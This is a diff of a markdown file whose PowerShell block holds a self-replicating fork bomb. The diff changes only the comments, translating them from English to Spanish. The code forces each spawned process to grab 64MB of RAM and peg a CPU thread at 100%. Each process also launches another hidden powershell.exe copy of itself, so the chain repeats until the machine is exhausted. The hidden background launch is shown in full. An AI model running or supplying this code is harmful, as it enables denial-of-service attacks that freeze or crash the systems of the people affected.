@@ -33,14 +33,13 @@ f
 
 ~~~powershell
 function f {
-    # 1. We inject a payload that forces EACH new process to immediately lock 1 CPU thread at 100%
-    # and physically consume 64MB of RAM before launching its own replication loop.
+# Inyectamos el payload que forza cada nuevo proceso a bloquear cada hilo de CPU al 100% y fisicamente consumir 64MB de RAM antes de lanzar cada bucle de replicación
     $Payload = {
-        # Keep a massive array alive in RAM to force true physical memory allocation
+        # Mantener un array masivo en RAM para forzar el alojado de memoria fisica 
         $MemBlock = [byte[]]::new(67108864) # 64 Megabytes per process
         for($i=0; $i -lt $MemBlock.Length; $i += 4096) { $MemBlock[$i] = 255 }
         
-        # Self-replication chain inside the child process
+        # Cadena de auto-replicación dentro del proceso hijo
         ${function:f} = '$FunctionDefinition'
         [System.Diagnostics.Process]::Start([System.Diagnostics.ProcessStartInfo]@{
             FileName        = "powershell.exe"
@@ -49,11 +48,11 @@ function f {
             UseShellExecute = $false
         }) | Out-Null
 
-        # Endless math calculation to hold the CPU thread permanently at 100%
+        # Calculo infinito para mantener el CPU a tope (100%)
         while($true) { $null = [Math]::Pow([Math]::Sqrt([Random]::new().Next()), 5) }
     }.ToString().Replace('$FunctionDefinition', ${function:f})
 
-    # 2. Launch the hidden background process using your preferred native .NET method
+    # Lanzado de proceso en segundo plano usando el metodo nativo de .NET
     $proc = [System.Diagnostics.Process]::Start([System.Diagnostics.ProcessStartInfo]@{
         FileName        = "powershell.exe"
         Arguments       = "-NoProfile -WindowStyle Hidden -Command $Payload"
